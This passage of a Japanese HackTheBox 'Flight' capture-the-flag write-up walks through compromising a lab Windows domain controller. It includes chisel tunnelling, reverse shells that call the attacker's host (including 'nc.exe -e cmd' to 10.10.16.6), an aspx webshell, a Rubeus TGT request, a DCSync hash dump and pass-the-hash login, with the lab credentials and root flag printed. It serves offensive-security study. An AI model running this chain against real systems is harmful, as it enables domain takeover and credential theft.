  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1516
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1136
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1712
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING       1900
  TCP    0.0.0.0:57875          0.0.0.0:0              LISTENING       2080
  TCP    10.129.200.222:53      0.0.0.0:0              LISTENING       1900
  TCP    10.129.200.222:80      10.10.16.4:36944       CLOSE_WAIT      5796
  TCP    10.129.200.222:139     0.0.0.0:0              LISTENING       4
  TCP    10.129.200.222:51408   10.10.16.4:4444        ESTABLISHED     5828
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1900
```
8000番なのでウェブ系かも  
windowsserver2019なのでcurlでヘッダを確認できた、どうやらiisが動作しているっぽい
```powershell
C:\xampp\htdocs\school.flight.htb>curl -s -I http://127.0.0.1:8000
HTTP/1.1 200 OK
Content-Length: 45949
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
Accept-Ranges: bytes
ETag: "03cf42dc9d5d31:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Wed, 15 Oct 2025 16:42:17 GMT
```
kaliから8000番ポートを確認するために、chiselでトンネリングを行う
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --smb-timeout 10 --share web --put-file '/home/kali/chisel_amd64.exe' '/school.flight.htb/chisel_amd64.exe'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.200.222  445    G0               [*] Copying /home/kali/chisel_amd64.exe to /school.flight.htb/chisel_amd64.exe
SMB         10.129.200.222  445    G0               [+] Created file /home/kali/chisel_amd64.exe on \\web\/school.flight.htb/chisel_amd64.exe
```
[リンク](https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696)を参考  
socksプロトコルでルーティング設定
```powershell
C:\xampp\htdocs\school.flight.htb>.\chisel_amd64.exe client 10.10.16.4:9999 R:8888:socks
2025/10/15 12:40:05 client: Connecting to ws://10.10.16.4:9999
2025/10/15 12:40:09 client: Connected (Latency 255.8101ms)
```
kaliのchiselサーバ上での接続確認
```sh
└─$ chisel server -p 9999 --reverse --socks5
2025/10/15 08:39:18 server: Reverse tunnelling enabled
2025/10/15 08:39:18 server: Fingerprint CyGxB5Wgdmo877NNZvx4lNKq2NP3h8JGHdevkXzRkfA=
2025/10/15 08:39:18 server: Listening on http://0.0.0.0:9999
2025/10/15 08:40:09 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/10/15 08:40:09 server: session#1: tun: proxy#R:127.0.0.1:8888=>socks: Listening
```
いざ8000番にアクセス！  
がホスト名やip関連でアクセス拒否されているっぽい、socksルーティングだから送信元はkaliのipのためアクセスできなさそう  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_04.png">  
ということで、ポートフォワーディングに変更
```powershell
C:\xampp\htdocs\school.flight.htb>.\chisel_amd64.exe client --max-retry-count 10 10.10.16.4:9999 R:8888:127.0.0.1:8000
2025/10/15 13:09:19 client: Connecting to ws://10.10.16.4:9999
2025/10/15 13:09:23 client: Connected (Latency 261.6722ms)
```
kaliのchiselサーバ上での接続確認
```sh
└─$ chisel server -p 9999 --reverse         
2025/10/15 09:04:44 server: Reverse tunnelling enabled
2025/10/15 09:04:44 server: Fingerprint lRVuImptTGdVS8rg4tUTdIxmePLeCDVpQAwzqfYTLMI=
2025/10/15 09:04:44 server: Listening on http://0.0.0.0:9999
2025/10/15 09:09:23 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/10/15 09:09:23 server: session#1: tun: proxy#R:8888=>8000: Listening
```
今度は8000番のwebサイトを確認できた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_05.png">


## STEP 7
適当にファイルにアクセスすると、エラー画面内にweb用と思われるフォルダパスを確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_06.png">  
このフォルダはユーザc.bumがwrite権限あり  
ユーザc.bumでaspx形式のwebshellを書き込みできそう
```powershell
C:\xampp\htdocs\school.flight.htb>icacls C:\inetpub\development
C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                       NT SERVICE\TrustedInstaller:(I)(F)
                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
smb経由でC:\inetpub\developmentにアクセスできないため、c.bumのシェル上でC:\inetpub\developmentにアクセスする必要がある  
c.bumのクレデンシャルは所持しているため、RunasCsでリバースシェルを取得する
```sh
└─$ wget -nv https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip                                          
2025-10-16 03:46:10 URL:https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-10-16T08%3A27%3A59Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-10-16T07%3A27%3A14Z&ske=2025-10-16T08%3A27%3A59Z&sks=b&skv=2018-11-09&sig=II3lLp0t5uK0KgQR6NfXvdW3FCTrn6XIS%2FLC9DGxSOU%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2MDYwMTM3NywibmJmIjoxNzYwNjAxMDc3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.LiL0b6z-qR9KnqRSZLb621UHDauY6OX9sGYsG_ucLwc&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [39889/39889] -> "RunasCs.zip" [1]
                                                                                                                                                                       
└─$ unzip RunasCs.zip 
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```
RunasCsをsmb経由で配送
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share web --put-file '/home/kali/RunasCs.exe' '/school.flight.htb/RunasCs.exe'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.200.222  445    G0               [*] Copying /home/kali/RunasCs.exe to /school.flight.htb/RunasCs.exe
SMB         10.129.200.222  445    G0               [+] Created file /home/kali/RunasCs.exe on \\web\/school.flight.htb/RunasCs.exe
```
RunasCs実行
```powershell
C:\xampp\htdocs\school.flight.htb>.\RunasCs.exe C.Bum Tikkycoll_431012284 cmd -r 10.10.16.6:5555
[*] Warning: The logon for user 'C.Bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-72b99$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2956 created in background.
```
c.bumのリバースシェル取得
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.200.222] 51044
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum
```
配送するaspx形式のwebshellをkaliのhttpサーバにアップロード
```sh
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
webshellをダウンロード  
```powershell
C:\Windows\system32>cd C:\inetpub\development
cd C:\inetpub\development

C:\inetpub\development>powershell /c "Invoke-Webrequest http://10.10.16.6/cmdasp.aspx -outfile test.aspx"
powershell /c "Invoke-Webrequest http://10.10.16.6/cmdasp.aspx -outfile webshell.aspx"

C:\inetpub\development>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\inetpub\development

10/16/2025  08:44 AM    <DIR>          .
10/16/2025  08:44 AM    <DIR>          ..
10/16/2025  08:42 AM    <DIR>          development
10/16/2025  08:44 AM             1,400 webshell.aspx
               1 File(s)          1,400 bytes
               3 Dir(s)   5,136,011,264 bytes free
```
webshellにアクセス、コマンドも実行確認  
iis apppool\defaultapppoolというサービスアカウントで動作している  
[公式サイト](https://learn.microsoft.com/ja-jp/iis/manage/configuring-security/application-pool-identities#accessing-the-network)で確認できる通り、サービスアカウントはマシンアカウントとしてドメイン環境にログインする  
iisはドメインコントローラ上で動作しているため、結果ドメコン機能をもつマシンアカウントのチケットを取得できるかも  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_07.png">  
まずはwebshell経由でリバースシェルを取得する  
nc.exeを配送
```sh
└─$ cp /usr/share/windows-resources/binaries/nc.exe .

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```powershell
C:\inetpub\development>powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
powershell /c "Invoke-Webrequest http://10.10.16.6/nc.exe -outfile nc.exe"
```
※webshell上で実行
```powershell
cmd /c C:\inetpub\development\nc.exe -e cmd 10.10.16.6 6666
```
リバースシェル取得
```powershell
└─$ rlwrap nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.200.222] 52930
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```


## STEP 8
念のためコンピュータアカウントg0$のプライマリグループidを確認、516でありドメコンであることを確認
```sh
└─$ ldapsearch -b 'DC=flight,DC=htb' -LLL -s 'sub' -D 'c.bum@flight.htb' -H ldap://10.129.200.222 -w 'Tikkycoll_431012284' 'sAMAccountName=g0$' 'primaryGroupID'
dn: CN=G0,OU=Domain Controllers,DC=flight,DC=htb
primaryGroupID: 516
```
所属グループであるドメインコントローラはドメインに対して、DS-Replication-Get-Changes-All権限をもつことを確認
```sh
└─$ ldapsearch -b 'DC=flight,DC=htb' -LLL -s 'sub' -D 'c.bum@flight.htb' -H ldap://10.129.200.222 -w 'Tikkycoll_431012284' 'sAMAccountName=Domain Controllers' 'distinguishedName' 
dn: CN=Domain Controllers,CN=Users,DC=flight,DC=htb
distinguishedName: CN=Domain Controllers,CN=Users,DC=flight,DC=htb

└─$ impacket-dacledit -ts -dc-ip '10.129.200.222' -principal-dn 'CN=Domain Controllers,CN=Users,DC=flight,DC=htb' -target-dn 'DC=flight,DC=htb' -action read -ace-type 'allowed' 'flight.htb/c.bum:Tikkycoll_431012284'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-10-17 02:04:51] [*] Parsing DACL
[2025-10-17 02:04:53] [*] Printing parsed DACL
[2025-10-17 02:04:53] [*] Filtering results for SID (S-1-5-21-4078382237-1492182817-2568127209-516)
[2025-10-17 02:04:53] [*]   ACE[12] info                
[2025-10-17 02:04:53] [*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[2025-10-17 02:04:53] [*]     ACE flags                 : None
[2025-10-17 02:04:53] [*]     Access mask               : ControlAccess
[2025-10-17 02:04:53] [*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[2025-10-17 02:04:53] [*]     Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[2025-10-17 02:04:53] [*]     Trustee (SID)             : Domain Controllers (S-1-5-21-4078382237-1492182817-2568127209-516)
```
ドメコン機能をもつマシンアカウントのチケットをrubeusで取得する
```sh
└─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe .        

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
rubeus実行  
ドメコン（g0.flight.htb）のtgtゲット！
```powershell
c:\Windows\System32\inetsrv>cd C:\Users\Public
cd C:\Users\Public

C:\Users\Public>powershell /c "Invoke-Webrequest http://10.10.16.6/Rubeus.exe -outfile rubeus.exe"
powershell /c "Invoke-Webrequest http://10.10.16.6/Rubeus.exe -outfile rubeus.exe"

C:\Users\Public>.\rubeus.exe tgtdeleg /nowrap
.\rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 26/TXe3ZnweAzmlhAswzQg3tTmvHYP2+eUsjsr8L/as=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECgHBiEQVn4ZViv9i3MF8N65eX7rtTp6EtVlwg6a2zy3Wm7oIgFBk/badWdyyaYlVuKSg3IgiSaqH9xPJtlps0/Cotu6hJjC+IxF2kXPPaYMVy0+OiFIOQ0wOCNvX/rmyOf7bmrp2CTfgYmJYsNQke+AdncCdAZmn07S644WV9ldOG/33Q6G+63WVQxvTQf+Dxei5FLURqdqtXl+dcR7zei38uJVHA3ihsoEVgg/sGcD37/r7Aw5BUmZl1IqxJoarrvEDp9Es41Np2ETYmJ4m1vrG7ka13xYw/8x8yuGvgHPRvxLZ0+1OdBs6TRoiWI64iaD5sc1CWKSPz/tyL7G+o4Il7SfsNO3Aj+oZKiPv4fkkZOY22ba98LzxGrL6e6dv78ALbgy4Z7FqP5TbKGnhtjITs9ZbHLXXzBT/nc/nEaQyE2/faIOkdu5B0uKvrPJhYnPHR2dEe5xGQVxe9bFCQRvzKeOJnOrj5WQA9cRxN/+wPk6jRZL1QkuE5QufumAOsN2/S/HYgO/jbxCMcD401YAly5tc9JZ5QbZDmX1sk+gF/8Z3iPtFYAvYUb05ykjj23KNZ6lJQCVnOeMBSlkH2K2+sUd3+wKv+XYix8f9iCsXdPeskewWc/hPr3NZgKG4CLbn298yNjc2jYYQSOig4PESKcILXxYKLnXSCnT4+ZEvhl3DCHNCpLj0S+DGN+ayG8+r614jGWor/QBSWA0hBGISRg/kab75u0Sn5TdSxn4xbShhkTywZju93gOn2aD4G02XoewJgvLc50KSkuAIsrKp5JelZIPkpNKy9RvcCmzbOKqlIF6FrVDMPhdRFM3Ooen/pb2kFb3cQvIZgVWP8h9MM+rnYu7dw4vABRZtJQXXmcvFxQ3kOtB84QgjHT8WAaN/wKJue+0jCRiq3CKUuEL8b/hS/YAkDbGqXp9Q6WOtLeGl8kU+uB9sWIaBqoJYzfujsQgtvA5KHZx6xuWZVfbreDI2z1hHUiaIdUSnogkSiW/Bbs36gyY44UqHnwXltuHEuJzzHlil1PThbqAEdd3QgvdkUWAvvzS/N49qxzNM8nal8E4kDqEMUFS0M5iaVUwI8yQ4DKu4mCcFYb1p+gzWh2E2IQ2w/uOpUwxfmg/+Xjy7JWFPWjT/hFF6w1kXU1zO5k1HQ5vjVaerzLsEUu3uvq2enycGT2XfhXphF9T0me2iIK1lohvO1AU/VgVGyFwhvXyyilXYHggwzU9f3vsCKD51AYKTxo75t0kjuBM3PmCs32K66PgJ1I+pYB1cIRFdg0n/Dpidi6fwO9MCT2TWNV+XwhVKeyU1jJG0oaWIc5d3IwNyifafhDN2IA+H18dLdEYX1WbyWwG19jG3pRQcieiJxWX+Yy1wo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgzNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbmuhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTAxNjE4NDk1NlqmERgPMjAyNTEwMTcwNDQ5NTZapxEYDzIwMjUxMDIzMTg0OTU2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```
kerberosチケットをlinux上で使用するために、kirbiからccacheに変換
```sh
└─$ base64 -d base64_ticket.kirbi > ticket.kirbi

└─$ impacket-ticketConverter ticket.kirbi ticket.ccachetype
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

└─$ export KRB5CCNAME=ticket.ccache
```
チケットの詳細を確認
```sh
└─$ impacket-describeTicket ticket.ccache 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : ccd5eb07f3a7c2c2ebd81bb539ceb71b7faf2fc295bbbfcb9fe121b4594d6e6b
[*] User Name                     : G0$
[*] User Realm                    : FLIGHT.HTB
[*] Service Name                  : krbtgt/FLIGHT.HTB
[*] Service Realm                 : FLIGHT.HTB
[*] Start Time                    : 16/10/2025 14:49:56 PM
[*] End Time                      : 17/10/2025 00:49:56 AM (expired)
[*] RenewTill                     : 23/10/2025 14:49:56 PM
[*] Flags                         : (0x60a10000) forwardable, forwarded, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : zNXrB/OnwsLr2Bu1Oc63G3+vL8KVu7/Ln+EhtFlNbms=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/FLIGHT.HTB
[*]   Service Realm               : FLIGHT.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
dcsync攻撃成功！  
ipアドレスでなくホスト名（flight.htbでも不可）を指定しないとPassTheTicketできなかった  
rubeusで'cifs/g0.flight.htb'に対するチケットを要求したから？
```sh
└─$ tail -n 1 /etc/hosts
10.129.228.120 flight.htb school.flight.htb g0.flight.htb
```
```sh
└─$ impacket-secretsdump -k -just-dc-user administrator -just-dc-ntlm -dc-ip 10.129.200.222 g0.flight.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Cleaning up...
```
winrmでadministratorログイン成功！ルートフラグゲット
```sh
└─$ evil-winrm -i 10.129.200.222 -u administrator -H '43bbfc530bab76141b12c8446e30c17c'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
e9212925cae6e072088c4cb67d794b8d
```

## おまけ
iis経由でシェルを取得したので、もちろん現ユーザはサービスアカウント
```powershell
C:\Users\Public>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
hotfixはなに一つない
```powershell
C:\Users\Public>systeminfo     
systeminfo

Host Name:                 G0
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA402
Original Install Date:     7/20/2021, 11:21:49 AM
System Boot Time:          10/17/2025, 4:35:23 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              it;Italian (Italy)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,534 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 4,187 MB
Virtual Memory: In Use:    1,316 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    flight.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.228.120
                                 [02]: fe80::9d1c:6eff:2a90:af98
                                 [03]: dead:beef::9d1c:6eff:2a90:af98
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
ということでポテト系の権限昇格も可能
